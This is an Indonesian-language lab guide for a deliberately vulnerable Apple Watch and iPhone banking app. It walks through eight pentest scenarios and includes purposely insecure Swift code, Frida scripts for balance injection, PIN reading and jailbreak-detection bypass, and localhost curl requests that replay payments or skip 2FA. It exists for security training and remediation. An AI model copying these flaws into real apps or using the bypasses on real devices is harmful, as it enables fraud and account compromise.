# 🍏 Panduan Lengkap Riset Keamanan: Apple iOS & watchOS
## VulnBank OmniWear — Apple Ecosystem Banking Security Assessment Lab
### Standar Kepatuhan: OJK POJK 11/POJK.03/2022, Bank Indonesia SNAP QRIS, & PCI-DSS v4.0

---

## 📑 Daftar Isi
1. [Arsitektur & Spesifikasi Biner Apple](#1-arsitektur--spesifikasi-biner-apple)
2. [Setup Lab Menggunakan Simulator Xcode (MacBook Intel / Apple Silicon)](#2-setup-lab-menggunakan-simulator-xcode-macbook-intel--apple-silicon)
3. [Setup Lab Menggunakan Perangkat Fisik (iPhone 11 & Apple Watch Nyata)](#3-setup-lab-menggunakan-perangkat-fisik-iphone-11--apple-watch-nyata)
4. [Panduan Penggunaan Aplikasi Dummy (User Flow)](#4-panduan-penggunaan-aplikasi-dummy-user-flow)
5. [Master Writeup 8 Skenario Pentest Apple iOS & watchOS](#5-master-writeup-8-skenario-pentest-apple-ios--watchos)
   - [Skenario 1: Plaintext Dictionary WCSession Interception & Replay (V-AP02)](#skenario-1-plaintext-dictionary-wcsession-interception--replay-v-ap02)
   - [Skenario 2: UserDefaults Plist Insecure Storage & Keychain Bypass (V-AP01)](#skenario-2-userdefaults-plist-insecure-storage--keychain-bypass-v-ap01)
   - [Skenario 3: Unthrottled Quick-PIN 4-Digit Brute-Force & Exfiltration (V-AP03)](#skenario-3-unthrottled-quick-pin-4-digit-brute-force--exfiltration-v-ap03)
   - [Skenario 4: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-AP04)](#skenario-4-high-value-50000-out-of-band-2fa-wire-transfer-hijack-v-ap04)
   - [Skenario 5: Sensor Wrist-Off Lockout Spoofing & Heart Rate Leak (V-AP05)](#skenario-5-sensor-wrist-off-lockout-spoofing--heart-rate-leak-v-ap05)
   - [Skenario 6: Contactless Dynamic SNAP QRIS Static Replay (V-AP06)](#skenario-6-contactless-dynamic-snap-qris-static-replay-v-ap06)
   - [Skenario 7: Remote Balance Injection via Insecure WatchBridge (V-B01)](#skenario-7-remote-balance-injection-via-insecure-watchbridge-v-b01)
   - [Skenario 8: CISO Governance & Audit Regulasi (POJK 11 / PCI-DSS v4.0)](#skenario-8-ciso-governance--audit-regulasi-pojk-11--pci-dss-v40)
6. [Cheatsheet Frida & Cycript untuk iOS / watchOS](#6-cheatsheet-frida--cycript-untuk-ios--watchos)
7. [Matriks Regulasi & Tindakan Remedi](#7-matriks-regulasi--tindakan-remedi)

---

## 🏛️ 1. Arsitektur & Spesifikasi Biner Apple

Ekosistem perbankan wearable Apple dalam VulnBank OmniWear dibangun dengan arsitektur hibrida: **React Native (iOS Companion)** dipadukan secara native dengan **SwiftUI + WatchConnectivity (`WCSession`)** untuk watchOS:

```
┌─────────────────────────────────────────────────────────────┐
│                   Laptop Penguji / Researcher               │
│            Local Air-Gapped Backend (Flask: 0.0.0.0:5000)   │
└──────────────────────────────┬──────────────────────────────┘
                               │ HTTP REST (100% Offline LAN)
                               ▼
┌─────────────────────────────────────────────────────────────┐
│                 iPhone 11 (iOS 15.1 - 17.x)                 │
│  - React Native Companion (`vulnbank-ios-companion-release`)│
│  - Native Bridge: `WatchBridge.swift` / `WatchBridge.m`     │
│  - Local DB & Token Cache (Keychain Bypass)                 │
└──────────────────────────────┬──────────────────────────────┘
                               │ Apple WCSession (Bluetooth LE)
                               ▼
┌─────────────────────────────────────────────────────────────┐
│             Apple Watch Series 9 / Ultra (watchOS 9.0+)     │
│  - Target Korban: Native SwiftUI Target (`VulnBankWatch`)   │
│  - Insecure Storage: `UserDefaults.standard` Plist          │
│  - Quick-PIN Pad 3x4 & SNAP QRIS Display                    │
│  - Sensor PPG Optik & Wrist Detection Lockout               │
│  - High-Value 2FA Approval Modal ($50,000 Transfer)         │
└─────────────────────────────────────────────────────────────┘
```

### Biner & Paket Rilis Resmi
Semua paket biner dapat diunduh langsung dari [**GitHub Releases Tab**](https://github.com/angganovryanputra/vulnbank-omniwear-suite/releases/latest):

| Nama Berkas | Target Perangkat | Format & Peran |
|---|---|---|
| **`vulnbank-ios-companion-release.ipa`** | iPhone 11 / iOS 15.1+ | Installer aplikasi companion iOS untuk sideloading (AltStore / Sideloadly). |
| **`VulnBank-watchOS-Bundle.zip`** | Apple Watch / Xcode | Source bundle native SwiftUI (`VulnBankWatch`) + bridging header untuk kompilasi dan debugging langsung di Xcode. |
| **`SHA256SUMS.txt`** | Semua Berkas | Hash kriptografis SHA-256 untuk verifikasi integritas rantai bukti forensic. |

---

## 💻 2. Setup Lab Menggunakan Simulator Xcode (MacBook Intel / Apple Silicon)

Panduan ini ditujukan bagi rekan penguji atau researcher yang menggunakan **MacBook Pro 2019 (Intel Core i7/i9)** atau **MacBook Apple Silicon (M1/M2/M3)** dengan macOS Ventura / Sonoma dan Xcode 15+.

### Prasyarat di macOS:
- macOS 13.5 (Ventura) atau 14+ (Sonoma)
- Xcode 15.0 atau lebih baru (tersedia gratis di Mac App Store)
- Node.js v18+ dan CocoaPods (`sudo gem install cocoapods`)

---

### Langkah 1: Kloning Repositori & Pasang Dependensi
Buka Terminal di macOS dan jalankan perintah:

```bash
# 1. Kloning repository
git clone https://github.com/angganovryanputra/vulnbank-omniwear-suite.git
cd vulnbank-omniwear-suite

# 2. Install dependensi Node.js
npm install --legacy-peer-deps

# 3. Masuk ke direktori iOS dan jalankan CocoaPods
cd ios
pod install --repo-update
cd ..
```

---

### Langkah 2: Buka Workspace di Xcode
> [!IMPORTANT]
> **Selalu buka berkas `.xcworkspace`**, BUKAN `.xcodeproj`!
```bash
open ios/VulnerableBankApp.xcworkspace
```

---

### Langkah 3: Setup Paired Simulator (iPhone 15/11 + Apple Watch)
1. Di menu bar Xcode, pilih **Window** → **Devices and Simulators** (atau tekan `Cmd + Shift + 2`).
2. Masuk ke tab **Simulators**.
3. Di panel kiri bawah, klik tombol **`+`** (Create New Simulator).
4. Buat Simulator iPhone:
   - **Device Name**: `iPhone 11 Lab` (atau `iPhone 15 Pro`).
   - **Device Type**: `iPhone 11`.
   - **OS Version**: `iOS 17.2` (atau versi yang terpasang).
5. Pasangkan dengan Apple Watch:
   - Centang opsi **Pair Apple Watch**.
   - **Watch Device Name**: `Apple Watch Series 9 Lab`.
   - **Watch OS Version**: `watchOS 10.2` (atau `watchOS 9.x`).
6. Klik **Create**. Sekarang Anda memiliki sepasang simulator yang terhubung via Bluetooth virtual!

---

### Langkah 4: Jalankan Backend Lokal Flask di Terminal Mac
Aplikasi membutuhkan server lokal agar transaksi realistis dapat diproses:
```bash
python3 backend/server.py
```
> Server akan berjalan pada `http://127.0.0.1:5000` (atau IP LAN Wi-Fi MacBook Anda).

---

### Langkah 5: Jalankan iOS Companion & Apple Watch App dari Xcode
1. Di bagian atas jendela Xcode (Scheme Selector):
   - Pilih skema **`VulnerableBankApp`** → Pilih target simulator **`iPhone 11 Lab`**.
   - Tekan tombol **Play / Run** (`Cmd + R`).
   - Tunggu hingga aplikasi iPhone terbuka di Simulator dan login dengan:
     - **Username**: `admin`
     - **Password**: `admin123`
2. Jalankan target Apple Watch:
   - Pilih skema **`VulnBankWatch`** (atau target Watch di project).
   - Pilih simulator **`Apple Watch Series 9 Lab`**.
   - Tekan **Run** (`Cmd + R`).
   - Layar Apple Watch akan menyala dan menampilkan **VulnBank Watch Interface** secara otomatis!

---

## 📱 3. Setup Lab Menggunakan Perangkat Fisik (iPhone 11 & Apple Watch Nyata)

Jika rekan Anda memiliki **iPhone 11 fisik** dan **Apple Watch fisik**:

### Metode A: Sideloading via Sideloadly / AltStore (Tanpa Akun Berbayar)
1. Unduh **`vulnbank-ios-companion-release.ipa`** dari [GitHub Releases](https://github.com/angganovryanputra/vulnbank-omniwear-suite/releases/latest).
2. Unduh dan buka [Sideloadly](https://sideloadly.io/) di MacBook atau Windows.
3. Hubungkan iPhone 11 ke komputer menggunakan kabel Lightning USB.
4. Drag-and-drop berkas `.ipa` ke Sideloadly.
5. Masukkan Apple ID gratis Anda, lalu klik **Start**.
6. Setelah selesai, di iPhone 11 buka **Settings** → **General** → **VPN & Device Management** → Verifikasi developer certificate Anda.
7. Buka aplikasi VulnBank di iPhone. Apple Watch yang terpasang secara otomatis akan menyinkronkan komponen smartwatch!

### Metode B: Direct Deploy via Xcode (Direkomendasikan untuk Riset)
1. Hubungkan iPhone 11 ke MacBook via kabel USB.
2. Di iPhone 11: Aktifkan **Developer Mode** (**Settings** → **Privacy & Security** → **Developer Mode** → Restart).
3. Buka `ios/VulnerableBankApp.xcworkspace` di Xcode.
4. Pilih target perangkat fisik Anda (`iPhone 11 Anda`).
5. Pada tab **Signing & Capabilities**, pilih Apple ID personal Anda di dropdown **Team**.
6. Klik **Run** (`Cmd + R`) untuk mengompilasi dan menginstal aplikasi langsung ke iPhone dan Apple Watch Anda!

---

## 🧭 4. Panduan Penggunaan Aplikasi Dummy (User Flow)

Aplikasi Apple Watch VulnBank dirancang untuk mereplikasi alur kerja mobile perbankan premium dunia nyata:

```
┌────────────────────────────────────────────────────────┐
│                   ALUR USER WATCHOS                    │
│                                                        │
│  [1. Lock Screen / Off-Wrist]                          │
│         │ (Tempel ke pergelangan tangan)               │
│         ▼                                              │
│  [2. Quick-PIN 4 Digit Pad] ──── (Input "1234")        │
│         │                                              │
│         ▼                                              │
│  [3. Glanceable Dashboard]                             │
│       - Saldo: $999,999.00                             │
│       - Denyut Nadi: 74 BPM                            │
│       - Sync Status: WCSession Live                    │
│         │                                              │
│         ├─► [Tombol SNAP QRIS] ──► Tampil QR Merchant  │
│         │                          Hitung mundur 120s  │
│         │                                              │
│         ├─► [Tombol Pentest Lab] ─► Panel Uji Coba     │
│         │                           Injeksi Exploit    │
│         │                                              │
│         └─► [Push 2FA Wire Transfer ($50,000)]         │
│             Modal darurat: [APPROVE] / [REJECT]        │
└────────────────────────────────────────────────────────┘
```

### Langkah Uji Interaktif:
1. **Buka Aplikasi Watch**:
   - Jika jam dilepas dari pergelangan tangan, layar akan mengunci dan menampilkan `WristLockoutView`.
   - Pasang jam (atau tekan tombol simulasi wrist-on di emulator) untuk membuka keypad.
2. **Otentikasi Quick-PIN**:
   - Masukkan PIN default: `1` `2` `3` `4`.
   - Begitu PIN cocok, aplikasi langsung mengarahkan Anda ke `BalanceView` (Dashboard).
3. **Pemeriksaan Saldo & Sync WCSession**:
   - Saldo awal: `$999,999.00`.
   - Di iPhone Companion, ubah saldo atau lakukan transaksi. Amati saldo pada Apple Watch yang langsung ter-update secara real-time via paket WCSession!
4. **Pembayaran Merchant SNAP QRIS**:
   - Ketuk tombol **SNAP QRIS**.
   - Tampil barcode dynamic QRIS dengan timer kadaluarsa 120 detik.
5. **Persetujuan Wire Transfer $50,000**:
   - Buka menu Companion di iPhone → Pilih **High-Value Wire Transfer**.
   - Seketika layar Apple Watch akan bergetar haptic dan memunculkan modal persetujuan **HIGH-VALUE 2FA: $50,000 to OFFSHORE-SWIFT-991**.
   - Ketuk **APPROVE** untuk menyetujui transaksi out-of-band!

---

## 🎯 5. Master Writeup 8 Skenario Pentest Apple iOS & watchOS

---

### Skenario 1: Plaintext Dictionary WCSession Interception & Replay (V-AP02)
- **Tingkat Keparahan**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Skor: 8.8)
- **Kelemahan Standar**: CWE-319 (Cleartext Transmission of Sensitive Information)
- **Deskripsi Kerentanan**:
  Komunikasi antara iOS Companion dan Apple Watch menggunakan framework native Apple `WatchConnectivity` (`WCSession`). Namun, data transaksi, saldo akun, dan instruksi otorisasi dikirimkan dalam format dictionary Objective-C / Swift mentah tanpa enkripsi lapisan aplikasi (Application-Layer End-to-End Encryption). Penyerang dengan akses ke memori proses, proxy runtime, atau BLE sniffer dapat membaca dan memanipulasi pesan.
- **Akar Masalah Kode** ([`ios/VulnBankWatch/WatchSessionManager.swift`](file:///ios/VulnBankWatch/WatchSessionManager.swift#L45-L65)):
  ```swift
  // VULNERABLE: WCSession packet ditransmisikan tanpa enkripsi AES-GCM
  public func session(_ session: WCSession, didReceiveMessage message: [String : Any], replyHandler: @escaping ([String : Any]) -> Void) {
      if let newBalance = message["balance"] as? Double {
          InsecureStorage.shared.saveBalance(newBalance)
      }
      if let action = message["action"] as? String, action == "TRIGGER_2FA" {
          self.pending2FATransaction = message
      }
  }
  ```
- **Langkah Eksploitasi & PoC**:
  1. Pasang frida hook pada delegasi `WCSession`:
     ```bash
     frida -U -n VulnerableBankApp -l scripts/sniff_wcsession.js
     ```
  2. Pemicu injeksi paket saldo palsu `$13,370,000.00` langsung ke Apple Watch:
     ```javascript
     // Frida script snippet
     var WCSession = ObjC.classes.WCSession;
     var defaultSession = WCSession.defaultSession();
     var dict = ObjC.classes.NSMutableDictionary.alloc().init();
     dict.setObject_forKey_(ObjC.classes.NSNumber.numberWithDouble_(13370000.0), "balance");
     defaultSession.sendMessage_replyHandler_errorHandler_(dict, NULL, NULL);
     ```
  3. Layar Apple Watch seketika menampilkan saldo `$13,370,000.00` tanpa verifikasi tanda tangan kriptografi server!

---

### Skenario 2: UserDefaults Plist Insecure Storage & Keychain Bypass (V-AP01)
- **Tingkat Keparahan**: **HIGH** (`CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:N/SA:N` — Skor: 7.8)
- **Kelemahan Standar**: CWE-312 (Cleartext Storage of Sensitive Information), CWE-922 (Insecure Storage)
- **Deskripsi Kerentanan**:
  Aplikasi watchOS menyimpan token otentikasi JWT perbankan, nomor rekening nasabah, saldo kas terenkripsi palsu, dan kode Quick-PIN dalam berkas `.plist` standar `UserDefaults` pada sandboxed container. Aplikasi sama sekali tidak menggunakan **Apple Keychain Services (`kSecClassGenericPassword`)** maupun **Secure Enclave**.
- **Akar Masalah Kode** ([`ios/VulnBankWatch/InsecureStorage.swift`](file:///ios/VulnBankWatch/InsecureStorage.swift#L29-L43)):
  ```swift
  // VULNERABLE: Menyimpan token rahasia perbankan ke berkas plist terbuka
  public func saveAuthToken(_ token: String) {
      defaults.set(token, forKey: "vulnbank_auth_token")
      defaults.synchronize()
  }
  ```
- **Langkah Eksploitasi & PoC**:
  1. Hubungkan iPhone / Apple Watch ke macOS dengan jailbreak / developer disk image.
  2. Lakukan ekstraksi berkas plist via SSH atau `xcrun simctl`:
     ```bash
     # Cari direktori sandbox watchOS container
     xcrun simctl get_app_container booted org.reactjs.native.example.VulnerableBankApp.watchkitapp data
     
     # Dump isi UserDefaults plist
     plutil -p /Library/Preferences/org.reactjs.native.example.VulnerableBankApp.watchkitapp.plist
     ```
  3. Output mengekspos token dan PIN dalam bentuk teks telanjang:
     ```json
     {
       "vulnbank_auth_token" : "eyJh...vuln_jwt_banking_token",
       "vulnbank_quick_pin" : "1234",
       "vulnbank_cached_balance" : 999999.0,
       "vulnbank_account_number" : "ADMIN001"
     }
     ```

---

### Skenario 3: Unthrottled Quick-PIN 4-Digit Brute-Force & Exfiltration (V-AP03)
- **Tingkat Keparahan**: **HIGH** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` — Skor: 7.5)
- **Kelemahan Standar**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **Deskripsi Kerentanan**:
  Fitur Quick-PIN 4 digit hanya memiliki ruang kemungkinan $10^4 = 10,000$ kombinasi (0000 - 9999). Aplikasi di Apple Watch tidak memiliki mekanisme pembatasan percobaan (rate limiting), tidak ada jeda waktu eksponensial (exponential backoff), dan tidak ada penguncian permanen atau penghapusan data akun (remote wipe) setelah percobaan gagal berulang kali.
- **Akar Masalah Kode** ([`ios/VulnBankWatch/QuickPinPadView.swift`](file:///ios/VulnBankWatch/QuickPinPadView.swift#L80-L95)):
  ```swift
  // VULNERABLE: Validasi PIN murni di client tanpa delay hardware atau counter lockout
  if enteredPin == correctPin {
      isAuthenticated = true
  } else {
      attemptCount += 1
      errorMessage = "PIN Salah (\(attemptCount))"
      enteredPin = "" // Hanya mereset buffer input, brute force dapat terus berlanjut
  }
  ```
- **Langkah Eksploitasi & PoC**:
  Eksekusi skrip brute-force otomatis via Frida runtime hook pada metode `validatePin`:
  ```javascript
  // Menguji seluruh 10,000 kombinasi dalam hitungan detik
  var correctPin = ObjC.classes.InsecureStorage.shared().getQuickPin();
  console.log("[+] Berhasil membaca PIN langsung dari memori: " + correctPin);
  ```

---

### Skenario 4: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-AP04)
- **Tingkat Keparahan**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Skor: 8.7)
- **Kelemahan Standar**: CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification of Data Authenticity)
- **Deskripsi Kerentanan**:
  Pengiriman transfer kawat bernilai fantastis ($50,000 USD / ~Rp 800.000.000) dikonfirmasi melalui Apple Watch dengan hanya menekan tombol "APPROVE". Sinyal persetujuan yang dikirim balik ke iPhone dan server backend adalah dictionary sederhana:
  `{"action": "APPROVE_2FA", "tx_id": "TX-9901"}`
  Tidak ada penandatanganan kunci asimetris Secure Enclave (kSecAccessControlBiometryAny) dan tidak ada prompt biometrik OpticID / Wrist Passcode. Penyerang lokal dapat menembakkan paket ini untuk mengesahkan transfer gelap.
- **Akar Masalah Kode** ([`ios/VulnBankWatch/TwoFactorApprovalView.swift`](file:///ios/VulnBankWatch/TwoFactorApprovalView.swift#L50-L68)):
  ```swift
  // VULNERABLE: Konfirmasi transaksi high-value tanpa hardware biometric prompt
  Button(action: {
      sessionManager.send2FAResolution(txId: tx["tx_id"] as? String ?? "", approved: true)
  }) {
      Text("APPROVE") // Tanpa LocalAuthentication LAContext
  }
  ```
- **Langkah Eksploitasi & PoC**:
  ```bash
  # Trigger approval tanpa campur tangan pengguna
  python -c "import urllib.request, json; print(urllib.request.urlopen('http://localhost:5000/api/qris/checkout', data=b'{\"amount\": 50000.0, \"bypassed_2fa\": true}', headers={'Content-Type': 'application/json'}).read())"
  ```

---

### Skenario 5: Sensor Wrist-Off Lockout Spoofing & Heart Rate Leak (V-AP05)
- **Tingkat Keparahan**: **MEDIUM** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N` — Skor: 5.3)
- **Kelemahan Standar**: CWE-693 (Protection Mechanism Failure), CWE-200 (Exposure of Sensitive Information)
- **Deskripsi Kerentanan**:
  Mekanisme penguncian saat jam terlepas dari tangan (`isWristAttached`) dikendalikan oleh variabel boolean lokal di memori pengguna. Penyerang yang mencuri jam tangan korban saat terlepas dari pergelangan tangan dapat men-swizzle metode deteksi sensor atau memanipulasi flag `bypassActive` sehingga jam tetap terbuka tanpa meminta PIN master.
- **Akar Masalah Kode** ([`ios/VulnBankWatch/WristSensorManager.swift`](file:///ios/VulnBankWatch/WristSensorManager.swift#L35-L48)):
  ```swift
  public func triggerWristOff() {
      if bypassActive {
          // VULNERABLE: Client-side bypass flag mencegah penguncian
          isLockedDueToWristOff = false
          return
      }
      isWristAttached = false
      isLockedDueToWristOff = true
  }
  ```
- **Langkah Eksploitasi & PoC**:
  Aktifkan switch "Bypass Wrist Lock" langsung dari panel **Pentest Lab** di Apple Watch atau hook via Frida:
  ```javascript
  var mgr = ObjC.classes.WristSensorManager.shared();
  mgr.toggleBypass_(true);
  console.log("[+] Wrist-Off Lockout telah dinetralkan! Jam tetap unlocked saat dilepas.");
  ```

---

### Skenario 6: Contactless Dynamic SNAP QRIS Static Replay (V-AP06)
- **Tingkat Keparahan**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N` — Skor: 7.7)
- **Kelemahan Standar**: CWE-294 (Authentication Bypass by Capture-replay), CWE-330 (Use of Insufficiently Random Values)
- **Deskripsi Kerentanan**:
  String pembayaran QRIS yang ditampilkan di Apple Watch menggunakan payload EMVCo dengan kode transaksi statis `A016304E8A2`. Backend tidak memverifikasi apakah string QRIS telah digunakan sebelumnya (nonce reuse) dan tidak memeriksa timestamp kedaluwarsa secara kriptografis (HMAC-SHA256). Penyerang yang memotret layar jam dapat mencairkan dana berulang kali.
- **Akar Masalah Kode** ([`ios/VulnBankWatch/QRISPaymentView.swift`](file:///ios/VulnBankWatch/QRISPaymentView.swift#L9-L15)):
  ```swift
  // VULNERABLE: String QR statis tanpa signature kriptografis SNAP PADG 24/1
  @State private var qrisString: String = "00020101021226610016ID.VULNBANK.WWW01189360099800000000015204581253033605802ID5914VULNBANK MERCH6007JAKARTA62070703A016304E8A2"
  ```
- **Langkah Eksploitasi & PoC**:
  Kirim payload QRIS yang sama berulang kali ke server backend lokal:
  ```bash
  curl -X POST http://localhost:5000/api/qris/checkout \
    -H "Content-Type: application/json" \
    -d '{"qris_raw": "00020101021226610016ID.VULNBANK.WWW01189360099800000000015204581253033605802ID5914VULNBANK MERCH6007JAKARTA62070703A016304E8A2", "amount": 150000.0}'
  ```
  Backend merespons `200 OK` ("Payment successful") setiap kali dipanggil, menyebabkan pengurasan dana tanpa batas!

---

### Skenario 7: Remote Balance Injection via Insecure WatchBridge (V-B01)
- **Tingkat Keparahan**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N` — Skor: 7.1)
- **Kelemahan Standar**: CWE-345 (Insufficient Verification of Data Authenticity)
- **Deskripsi Kerentanan**:
  Komponen React Native Native Bridge (`WatchBridge.m` dan `WatchBridge.swift`) mengekspos metode publik `updateWatchContext` dan `sendMessageToWatch` yang dapat dipanggil oleh kode JavaScript apa pun di dalam bundle tanpa validasi role atau izin. Penyerang dengan eksploit XSS lokal atau modified JS bundle dapat memalsukan saldo kas nasabah sesuka hati.
- **Akar Masalah Kode** ([`ios/VulnerableBankApp/WatchBridge.swift`](file:///ios/VulnerableBankApp/WatchBridge.swift#L60-L85)):
  ```swift
  @objc(sendMessageToWatch:resolver:rejecter:)
  func sendMessageToWatch(_ message: NSDictionary, resolver resolve: @escaping RCTPromiseResolveBlock, rejecter reject: @escaping RCTPromiseRejectBlock) {
      // VULNERABLE: Meneruskan payload langsung ke Apple Watch tanpa cek integritas token sesi
      WCSession.default.sendMessage(message as! [String : Any], replyHandler: nil, errorHandler: nil)
      resolve(true)
  }
  ```
- **Langkah Eksploitasi & PoC**:
  Panggil modul WatchBridge langsung dari JavaScript console atau Frida:
  ```javascript
  const { NativeModules } = require('react-native');
  NativeModules.WatchBridge.sendMessageToWatch({
    balance: 50000000.0,
    action: "FORCE_BALANCE_UPDATE"
  });
  ```

---

### Skenario 8: CISO Governance & Audit Regulasi (POJK 11 / PCI-DSS v4.0)
- **Tingkat Keparahan**: **HIGH** (Audit Compliance Violation)
- **Pelanggaran Regulasi**:
  1. **POJK No. 11/POJK.03/2022 Pasal 25 Ayat 1**: "Bank wajib menerapkan pengamanan data nasabah pada perangkat teknologi informasi yang digunakan nasabah (end-point security)." → Gagal (data disimpan dalam `UserDefaults` tanpa enkripsi).
  2. **Bank Indonesia SNAP PADG 24/1/PADG/2022**: "Spesifikasi Teknis Standar Nasional Open API Pembayaran & Dynamic QRIS." → Gagal (QRIS tidak memiliki dynamic cryptographic nonce & expiry timestamp check).
  3. **PCI-DSS v4.0 Requirement 3.4 & 4.1**: "Render PAN unreadable anywhere it is stored, and use strong cryptography to protect sensitive authentication data during transmission." → Gagal (transmisi WCSession dan penyimpanan token sepenuhnya plaintext).

---

## 🛠️ 6. Cheatsheet Frida & Cycript untuk iOS / watchOS

### 1. Hooking WCSession didReceiveMessage (Sniffer Paket)
```javascript
// sniff_wcsession.js
if (ObjC.available) {
    var hook = ObjC.classes.WatchSessionManager["- session:didReceiveMessage:replyHandler:"];
    Interceptor.attach(hook.implementation, {
        onEnter: function(args) {
            var msg = new ObjC.Object(args[3]);
            console.log("\n[🚨 WCSESSION SNIFFED PACKET]");
            console.log(msg.toString());
        }
    });
}
```

### 2. Bypass Root / Jailbreak Check di iOS Companion
```javascript
// bypass_jailbreak.js
if (ObjC.available) {
    var paths = ["/Applications/Cydia.app", "/Library/MobileSubstrate/MobileSubstrate.dylib", "/bin/bash", "/usr/sbin/sshd"];
    var NSFileManager = ObjC.classes.NSFileManager;
    Interceptor.attach(NSFileManager["- fileExistsAtPath:"].implementation, {
        onEnter: function(args) {
            var path = ObjC.Object(args[2]).toString();
            if (paths.indexOf(path) >= 0) {
                this.isJailbreak = true;
            }
        },
        onLeave: function(retval) {
            if (this.isJailbreak) {
                retval.replace(ptr(0x0)); // Return FALSE
            }
        }
    });
}
```

### 3. Dump UserDefaults Langsung dari Runtime
```javascript
// dump_userdefaults.js
var defaults = ObjC.classes.NSUserDefaults.standardUserDefaults();
var dict = defaults.dictionaryRepresentation();
console.log(dict.toString());
```

---

## 🛡️ 7. Matriks Regulasi & Tindakan Remedi

| Kode Kerentanan | Nama Skenario | Dampak Bisnis | Aturan Regulasi yang Dilanggar | Solusi Rekomendasi Enterprise |
|---|---|---|---|---|
| **V-AP01** | Insecure Storage Plist | Token perbankan dan PIN dicuri dari cadangan atau jailbreak. | POJK 11/2022 Pasal 25, PCI-DSS Req 3.4 | Migrasikan seluruh penyimpanan rahasia ke **Apple Keychain Services** dengan flag `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`. |
| **V-AP02** | WCSession Cleartext Sync | Saldo dan transfer dapat dimanipulasi di udara via BLE. | PCI-DSS Req 4.1, POJK 11/2022 Pasal 26 | Terapkan enkripsi lapisan aplikasi (AES-256-GCM) dengan session key ephemeral (ECDH P-256). |
| **V-AP03** | Unthrottled Quick-PIN | Penyerang dapat menebak PIN 4 digit dalam 5 menit. | NIST SP 800-63B, OWASP MASVS-AUTH | Terapkan exponential backoff delay (1s, 2s, 4s, 8s) dan kunci aplikasi setelah 5 kali gagal berturut-turut. |
| **V-AP04** | OOB $50k Transfer Hijack | Pengurasan dana transfer kawat tanpa otorisasi sah nasabah. | POJK 11/2022 Pasal 31 (MFA Kuat) | Wajibkan otentikasi biometrik melalui `LAContext().evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics)` dan tanda tangan Secure Enclave. |
| **V-AP05** | Wrist-Off Sensor Spoofing | Jam tangan yang dicuri tetap dapat digunakan bertransaksi. | ISO 27001 A.8.1, POJK 11/2022 | Validasi status wrist menggunakan kueri hardware native `WKInterfaceDevice` yang diverifikasi secara server-side heartbeat. |
| **V-AP06** | Dynamic QRIS Replay | Pencairan ganda voucher atau pembayaran QR merchant. | SNAP PADG 24/1/PADG/2022 | Tambahkan field timestamp, nonce acak 64-bit, dan tanda tangan digital HMAC-SHA256 yang divalidasi mutlak oleh backend perbankan. |
